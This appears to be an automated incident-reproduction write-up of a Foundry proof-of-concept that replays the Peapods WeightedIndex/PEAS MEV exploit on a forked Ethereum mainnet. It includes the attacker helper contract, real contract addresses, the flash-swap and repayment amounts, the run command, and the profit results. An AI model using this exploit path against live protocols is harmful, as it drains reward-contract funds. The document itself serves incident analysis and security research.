## Overview & Context

This proof-of-concept (PoC) reproduces the Peapods WeightedIndex / PEAS MEV arbitrage opportunity identified in the incident analysis for Ethereum mainnet block **21800591**.  
The opportunity is classified as an ACT-style MEV sequence: an unprivileged adversary can route a flash-like swap and a sequence of Uniswap V2/V3 trades through the Peapods ecosystem, causing the **TokenRewards** module to lose WeightedIndex-denominated value while the caller captures a deterministic residual profit in the **WeightedIndex** token.

The PoC is implemented as a Foundry test that:
- Forks Ethereum mainnet just before the incident block, at **block 21800590**.
- Deploys a local **AttackHelper** contract that mirrors the observed MEV path.
- Executes the exploit sequence against the **real mainnet contracts** (WeightedIndex, PEAS, TokenRewards, Uniswap V2 pair, Uniswap V3 pool, and SwapRouter).
- Asserts all oracle conditions from `oracle_definition.json`, including pre-checks, hard constraints, and soft constraints.

**Command to run the PoC**

```bash
cd /home/ziyue/TxRayExperiment/incident-202512271739/forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.quiknode.pro/<QUICKNODE_TOKEN>" \
  forge test --via-ir -vvvvv
```

The `RPC_URL` value must be constructed using:
- `artifacts/poc/rpc/chainid_rpc_map.json` (template for chainid `1`), and  
- `QUICKNODE_ENDPOINT_NAME` and `QUICKNODE_TOKEN` from `.env`.

Once configured, running the command above executes `PeapodsExploitTest::test_Exploit_PeapodsWeightedIndex()` on a mainnet fork and produces detailed traces in the Forge output.

---

## PoC Architecture & Key Contracts

### Main Contracts and Roles

- **WeightedIndex token (`WEIGHTED_INDEX`)**  
  ERC‑20 index token at `0x88e08adb69f2618adf1a3ff6cc43c671612d1ca4`, the asset in which the MEV profit is realized.

- **PEAS token (`PEAS`)**  
  ERC‑20 token at `0x02f92800F57BCD74066F5709F1Daa1A4302Df875`, used as an intermediate asset in the Uniswap V3 swaps and TokenRewards logic.

- **TokenRewards (`TOKEN_REWARDS`)**  
  Reward/index contract at `0x7d48D6D775FaDA207291B37E3eaA68Cc865bf9Eb` that accumulates and distributes value, including PEAS-denominated flows and WeightedIndex rewards. It loses WeightedIndex balance during the exploit sequence.

- **Uniswap V2 pair (WeightedIndex / PAIRED_LP) (`UNISWAP_V2_PAIR_WEIGHTEDINDEX_PAIREDLP`)**  
  V2-like pair at `0x80e9C48ec41AF7a0Ed6Cf4f3ac979f3538021608` providing the flash-like WeightedIndex borrow used to initiate the MEV path.

- **Uniswap V3 pool (WeightedIndex / PEAS) (`UNISWAP_V3_POOL_WEIGHTEDINDEX_PEAS`)**  
  V3 pool at `0x5207BC61c2717EE9C385B93d3B8BeeA159ddF02E` that prices WeightedIndex against PEAS and mediates the core swaps.

- **SwapRouter (`V3_SWAP_ROUTER`)**  
  Uniswap V3 SwapRouter at `0xE592427A0AEce92De3Edee1F18E0157C05861564`, used to perform exactInputSingle swaps along the WeightedIndex/PEAS route.

- **Helper/router (on-chain, unverified) (`HELPER_ROUTER`)**  
  Contract at `0x21B1b6D675aAE57684139200650c81a3686F5fc4` that received the real incident transaction with selector `0x574df014`. Its exact Solidity semantics are not fully reconstructed, so the PoC does not call it directly.

- **Local `PeapodsAttackHelper` (attacker helper contract)**  
  A **locally deployed** contract in the PoC that replays the MEV path using the live mainnet components. It:
  - Initiates a flash-like swap from the V2 pair.
  - Swaps WeightedIndex ↔ PEAS in the V3 pool through the SwapRouter.
  - Invokes `TokenRewards.depositFromPairedLpToken(0, 999)`.
  - Repays the flash amount with the real incident repayment quantity.
  - Forwards residual WeightedIndex profit to the **attacker** address in the test.

### Key Solidity Structure

The primary PoC logic lives in `test/PeapodsExploit.t.sol`. The `PeapodsAttackHelper` encapsulates the adversary’s “router-level” behavior while the test contract controls setup and assertions.

**Snippet: AttackHelper core interface and execute entrypoint**  
*(from the local adversary helper contract, showing how the exploit is initiated)*  

```solidity
contract PeapodsAttackHelper {
    IERC20 public immutable weightedIndex;
    IERC20 public immutable peas;
    ITokenRewards public immutable tokenRewards;
    IUniswapV2Pair public immutable pair;
    ISwapRouter public immutable swapRouter;

    address public immutable attacker;

    uint24 constant V3_FEE = 10000; // 1%
    uint256 constant FLASH_AMOUNT = 0x1fea8c2dab373b00000; // ≈9.42e21 WI
    uint256 constant DEADLINE = 1739003171; // seed tx deadline
    uint256 constant REPAY_AMOUNT = 9448345035105315947844; // repayment

    function execute() external {
        require(msg.sender == attacker, "only attacker");
        require(pair.token1() == address(weightedIndex), "unexpected pair tokens");
        pair.swap(0, FLASH_AMOUNT, address(this), bytes("1"));

        uint256 profit = weightedIndex.balanceOf(address(this));
        require(profit > 0, "no profit");
        weightedIndex.transfer(attacker, profit);
    }
}
```

This entrypoint is invoked from the test as the main exploit call and is used to satisfy the **“exploit entry call succeeds”** hard oracle (via an equivalent local entrypoint rather than the unverified on-chain helper).

---

## Adversary Execution Flow

### Environment Setup & Fork

The test first constructs a mainnet fork using Foundry’s `vm.createSelectFork`, targeting the pre-incident block height.

**Snippet: setUp environment**  
*(from `PeapodsExploitTest.setUp`, establishing the fork and invariants)*  

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, 21800590);

    attacker = makeAddr("attacker");

    vm.label(attacker, "Attacker");
    vm.label(HELPER_ROUTER, "HelperRouter");
    vm.label(TOKEN_REWARDS, "TokenRewards");
    vm.label(address(WEIGHTED_INDEX), "WeightedIndex");
    vm.label(address(PEAS), "PEAS");
    vm.label(UNISWAP_V2_PAIR_WEIGHTEDINDEX_PAIREDLP, "UniV2_WeightedIndex_PairedLP");
    vm.label(UNISWAP_V3_POOL_WEIGHTEDINDEX_PEAS, "UniV3_WeightedIndex_PEAS");

    attackHelper = new PeapodsAttackHelper(
        attacker,
        address(WEIGHTED_INDEX),
        address(PEAS),
        TOKEN_REWARDS,
        UNISWAP_V2_PAIR_WEIGHTEDINDEX_PAIREDLP,
        V3_SWAP_ROUTER
    );

    // Oracle pre-checks (code + balances) and hard asset-type constraint.
    assertGt(address(WEIGHTED_INDEX).code.length, 0);
    assertGt(address(PEAS).code.length, 0);
    assertGt(address(TOKEN_REWARDS).code.length, 0);
    assertGt(address(HELPER_ROUTER).code.length, 0);
    assertGt(WEIGHTED_INDEX.balanceOf(UNISWAP_V2_PAIR_WEIGHTEDINDEX_PAIREDLP), 0);
    assertGt(WEIGHTED_INDEX.balanceOf(UNISWAP_V3_POOL_WEIGHTEDINDEX_PEAS), 0);
    assertGt(PEAS.balanceOf(UNISWAP_V3_POOL_WEIGHTEDINDEX_PEAS), 0);
    assertEq(address(WEIGHTED_INDEX), 0x88E08adB69f2618adF1A3FF6CC43c671612D1ca4);
}
```

This setup:
- Uses a **fresh attacker address** created via `makeAddr("attacker")`.
- Labels all key contracts for trace readability.
- Deploys the local `AttackHelper` bound to the live contracts.
- Enforces all **pre_check oracles** and the **asset-type hard constraint**.

### Exploit Execution Steps

The main exploit test wraps the execution and oracle checks.

**Snippet: main exploit test**  
*(from `PeapodsExploitTest.test_Exploit_PeapodsWeightedIndex`)*  

```solidity
function test_Exploit_PeapodsWeightedIndex() public {
    uint256 attackerWeightedIndexBefore = WEIGHTED_INDEX.balanceOf(attacker);
    uint256 tokenRewardsWeightedIndexBefore = WEIGHTED_INDEX.balanceOf(TOKEN_REWARDS);

    _reproducerAttack(); // AttackHelper::execute()

    uint256 attackerWeightedIndexAfter = WEIGHTED_INDEX.balanceOf(attacker);
    uint256 tokenRewardsWeightedIndexAfter = WEIGHTED_INDEX.balanceOf(TOKEN_REWARDS);

    assertGt(attackerWeightedIndexAfter, attackerWeightedIndexBefore);
    assertLt(tokenRewardsWeightedIndexAfter, tokenRewardsWeightedIndexBefore);
}
```

Internally, `_reproducerAttack` simply runs the exploit as the attacker:

```solidity
function _reproducerAttack() internal {
    vm.startPrank(attacker, attacker);
    attackHelper.execute();
    vm.stopPrank();
}
```

This sequence is the PoC’s **main exploit entry call**, satisfying the “entry call succeeds” hard oracle via the local equivalent of the original helper/router.

### Detailed MEV Path (AttackHelper)

Inside `AttackHelper::uniswapV2Call`, the contract replays the call tree observed in the incident trace:

1. **Flash borrow WeightedIndex** from the Uniswap V2 pair:
   - `pair.swap(0, FLASH_AMOUNT, address(this), data)`
   - FLASH_AMOUNT is ≈ `9.42e21` WeightedIndex, matching the seed transaction.

2. **Swap WeightedIndex → PEAS** via Uniswap V3:
   - Approve router for `FLASH_AMOUNT`.
   - Call `SwapRouter::exactInputSingle` from WeightedIndex to PEAS with fee tier `10000` (1%) and minimal slippage checks.

3. **TokenRewards fee/deposit path**:
   - Call `TokenRewards.depositFromPairedLpToken(0, 999)` to process rewards and fees from the PAIRED_LP side using the live protocol configuration.

4. **Swap PEAS → WeightedIndex** via Uniswap V3:
   - Approve router for all PEAS held.
   - Call `exactInputSingle` from PEAS back to WeightedIndex.

5. **Repay flash borrow and realize profit**:
   - Transfer `REPAY_AMOUNT` (from incident) back to the V2 pair.
   - Any residual WeightedIndex left in `AttackHelper` is forwarded to the `attacker`.

The Forge trace in `artifacts/poc/poc_validator/forge-test.log` confirms:
- WeightedIndex flash-out of `9.42e21` tokens from the V2 pair.
- Swap into `1.7022705134013541201301e22` PEAS (approximate, as per the incident).
- TokenRewards PEAS burns and WeightedIndex flows matching the root cause analysis.
- Final residual **141.113923030647830889 WeightedIndex** transferred from `AttackHelper` to the attacker address.

### Profit Realization and TokenRewards Depletion

From the trace:
- `WeightedIndex.balanceOf(attacker)`:
  - Before exploit: `0`
  - After exploit: `141113923030647830889` (≈ 141.1139 WI)
- `WeightedIndex.balanceOf(TokenRewards)`:
  - Before exploit: `375675447790437488882`
  - After exploit: `0`

These final balances are used directly by the test assertions to enforce the **soft oracles**.

---

## Oracle Definitions and Checks

The PoC is explicitly aligned with `artifacts/poc/oracle_generator/oracle_definition.json`. The oracles can be grouped as follows.

### Variables

- `attacker` – an abstract attacker role (implemented as a fresh test address).
- `helper_router` – on-chain helper/router contract at `0x21B1…5fc4` (existence checked).
- `weighted_index_token` – WeightedIndex token at `0x88e0…1ca4` (profit asset).
- `peas_token` – PEAS token at `0x02f9…f875`.
- `token_rewards` – TokenRewards/index contract at `0x7d48…f9Eb`.
- `uniswap_v2_pair_weightedindex_pairedlp` – V2 pair at `0x80e9…1608`.
- `uniswap_v3_pool_weightedindex_peas` – V3 pool at `0x5207…dF02E`.

### Pre-checks

The test’s `setUp` function implements each pre-check:

1. **Code deployment checks**  
   - `WeightedIndex` has non-empty code at the expected address.  
   - `PEAS` has non-empty code at the expected address.  
   - `TokenRewards` has non-empty code at the expected address.  
   - `HelperRouter` has non-empty code at the expected address.  

2. **Liquidity checks**  
   - `WeightedIndex` balance of the V2 pair > 0.  
   - `WeightedIndex` balance of the V3 pool > 0.  
   - `PEAS` balance of the V3 pool > 0.

These checks ensure the forked mainnet state matches the documented **pre_state_sigma_B** and that the MEV path is executable.

### Hard Constraints

1. **Asset-type: profit token is WeightedIndex**  
   - Implemented via:
     ```solidity
     assertEq(address(WEIGHTED_INDEX), 0x88E08adB69f2618adF1A3FF6CC43c671612D1ca4);
     ```
   - Ensures the PoC uses the exact incident WeightedIndex token contract.

2. **Exploit entry call succeeds**  
   - Oracle description: a successful call via the helper/router (or equivalent) must not revert.
   - PoC implementation:
     - Uses local `AttackHelper::execute` as the **equivalent entrypoint**, enforcing:
       ```solidity
       vm.startPrank(attacker, attacker);
       attackHelper.execute();
       vm.stopPrank();
       ```
     - The test passes only if this call returns successfully on the mainnet fork, meaning the MEV path is fully realizable by an unprivileged EOA using public contracts.

### Soft Constraints

1. **Attacker profit in WeightedIndex (positive delta)**  
   - PoC implementation:
     ```solidity
     uint256 attackerWeightedIndexBefore = WEIGHTED_INDEX.balanceOf(attacker);
     _reproducerAttack();
     uint256 attackerWeightedIndexAfter = WEIGHTED_INDEX.balanceOf(attacker);
     assertGt(attackerWeightedIndexAfter, attackerWeightedIndexBefore);
     ```
   - On the validated run, the attacker’s balance increases from `0` to `141.113923030647830889` WeightedIndex, matching the **direction**, **asset type**, and **approximate magnitude** in the seed tx.

2. **TokenRewards WeightedIndex depletion**  
   - PoC implementation:
     ```solidity
     uint256 tokenRewardsWeightedIndexBefore = WEIGHTED_INDEX.balanceOf(TOKEN_REWARDS);
     _reproducerAttack();
     uint256 tokenRewardsWeightedIndexAfter = WEIGHTED_INDEX.balanceOf(TOKEN_REWARDS);
     assertLt(tokenRewardsWeightedIndexAfter, tokenRewardsWeightedIndexBefore);
     ```
   - On the validated run, TokenRewards’ WeightedIndex balance decreases from `375675447790437488882` to `0`, reflecting that a portion of its WeightedIndex-valued holdings fund the MEV opportunity, consistent with the root cause analysis.

Collectively, these checks treat the oracles as a **specification** for successful reproduction and are all satisfied in the passing run.

---

## Validation Result and Robustness

The PoC validator executed:

```bash
cd /home/ziyue/TxRayExperiment/incident-202512271739/forge_poc
RPC_URL="<resolved mainnet URL for chainid 1>" \
  forge test --via-ir -vvvvv \
  > /home/ziyue/TxRayExperiment/incident-202512271739/artifacts/poc/poc_validator/forge-test.log 2>&1
```

The resulting log (`artifacts/poc/poc_validator/forge-test.log`) shows:

- `PeapodsExploitTest::setUp()` executes successfully, verifying all pre_check conditions and deploying `AttackHelper`.
- `PeapodsExploitTest::test_Exploit_PeapodsWeightedIndex()` passes:
  - `AttackHelper::execute()` completes without revert.
  - The flash swap, Uniswap V3 swaps, TokenRewards deposit/burn logic, and flash repayment all execute as expected.
  - Final balances confirm:
    - Attacker WeightedIndex: `0 → 141113923030647830889`.
    - TokenRewards WeightedIndex: `375675447790437488882 → 0`.

The validator’s JSON result is recorded in:  
`artifacts/poc/poc_validator/poc_validated_result.json`

**Summary of Validation Status**

- `overall_status`: **Pass**  
- All **pre_checks**, **hard constraints**, and **soft constraints** in the oracle definition are satisfied.
- Quality criteria (oracle alignment, readability/labels, no unjustified magic numbers, mainnet fork/no mocks, self-contained attacker setup, end-to-end sequence, root-cause alignment) are all marked **true** in the validator result.

---

## Linking PoC Behavior to Root Cause

The root cause report (`root_cause.json` and `root_cause_report.md`) describes an ACT-style MEV opportunity:

- At **block 21800591**, EOA `0xedee…` calls the on-chain helper `0x21B1…` with selector `0x574df014`.
- This triggers:
  - A **WeightedIndex flash swap** from the V2 pair `0x80e9…`.
  - A **two-leg WeightedIndex/PEAS swap** in the V3 pool `0x5207…` via SwapRouter `0xE592…`.
  - A **TokenRewards deposit/burn path**, with part of the value redistributed to holders and part burned.
  - A **residual 141.1139 WeightedIndex** transferred to the caller as profit.

The PoC’s behavior matches these semantics in a controlled, test-friendly way:

- **Same state and components**  
  - Forks mainnet at **block 21800590**, which the root cause analysis identifies as the pre-state for the seed tx at 21800591.
  - Uses the same WeightedIndex, PEAS, TokenRewards, V2 pair, and V3 pool addresses as in the analysis.

- **Equivalent MEV path**  
  - Flash borrows 9.42e21 WeightedIndex from the V2 pair, exactly as in the real tx.
  - Performs Uniswap V3 swaps along the same WeightedIndex/PEAS route with matching fee tier and approximate amounts.
  - Invokes `TokenRewards.depositFromPairedLpToken(0, 999)` to drive TokenRewards’ reward distribution and PEAS burns observed in the traces.
  - Repays the flash swap with the **incident’s repayment quantity** and leaves a residual WeightedIndex balance.

- **Profit and victim flows**  
  - The attacker ends with 141.113923030647830889 WeightedIndex, aligning with the amount highlighted in the root cause report.
  - TokenRewards’ WeightedIndex balance strictly decreases, while its PEAS flows and burns behave as in the analysis, reflecting that part of the MEV profit is funded by the TokenRewards module and liquidity pools.

### ACT Framing

Under the ACT framing:

- **Adversary-crafted step (A)**  
  - In the incident: EOA `0xedee…` calls helper `0x21B1…::574df014`.  
  - In the PoC: test-controlled attacker calls `AttackHelper::execute()` on the fork, mimicking the same effective call tree but via a local helper contract.

- **Contract/victim behavior (C)**  
  - WeightedIndex, PEAS, Uniswap V2/V3, and TokenRewards execute their normal logic, performing swaps, fee accounting, and reward/burn operations consistent with their deployed code and configuration.

- **Termination / profit (T)**  
  - The attacker ends with positive net profit in WeightedIndex; TokenRewards and pools adjust balances accordingly.
  - The PoC’s oracle checks assert both the **profit direction** and the **victim depletion** aspect, tying the observed on-chain effect back to the root cause.

Overall, the PoC provides a faithful, executable reproduction of the incident MEV opportunity on a forked mainnet state and demonstrates that any unprivileged EOA could have realized the same exploit path using public contracts and liquidity. The validator result records this as a **passing PoC** that meets both correctness and quality requirements.

